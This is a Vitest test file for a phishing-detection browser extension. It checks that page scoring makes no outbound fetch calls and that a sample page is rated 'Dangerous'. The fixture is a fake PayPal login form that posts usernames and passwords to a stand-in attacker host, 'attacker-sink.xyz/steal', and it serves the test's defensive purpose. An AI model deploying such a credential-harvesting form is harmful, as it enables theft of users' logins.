import { describe, it, expect, vi } from "vitest";
import { ScoringOrchestrator } from "../src/background/scoring-orchestrator";
import { NavigationTracker } from "../src/background/navigation-tracker";

describe("TrustLens Zero-Egress Privacy Verification", () => {
  it("proves zero outbound network requests occur during full evaluation", async () => {
    // Spy on global fetch and XMLHttpRequest
    const fetchSpy = vi.fn();
    const originalFetch = globalThis.fetch;
    globalThis.fetch = fetchSpy as any;

    const navTracker = new NavigationTracker();
    const orchestrator = new ScoringOrchestrator(navTracker);

    const testUrl = "https://suspicious-test-portal.xyz/verify";
    const testHtml = `
      <html><head><title>PayPal Login</title></head><body>
      <form action='https://attacker-sink.xyz/steal' method='POST'>
        <input type='text' name='user' />
        <input type='password' name='pass' />
      </form>
      </body></html>
    `;

    // 1. Evaluate Stage 1 (URL navigation start)
    const report1 = await orchestrator.evaluatePage(101, testUrl, null, 1);
    expect(report1.verdict).toBeDefined();

    // 2. Evaluate Stage 2 (DOMContentLoaded full DOM & forms)
    const report2 = await orchestrator.evaluatePage(101, testUrl, testHtml, 2);
    expect(report2.verdict).toBe("Dangerous");

    // 3. Evaluate Stage 3 (Dynamic mutation re-score)
    const report3 = await orchestrator.evaluatePage(101, testUrl, testHtml, 3);
    expect(report3.verdict).toBe("Dangerous");

    // ZERO FETCH CALLS MADE
    expect(fetchSpy).not.toHaveBeenCalled();

    // Cleanup
    globalThis.fetch = originalFetch;
  });
});
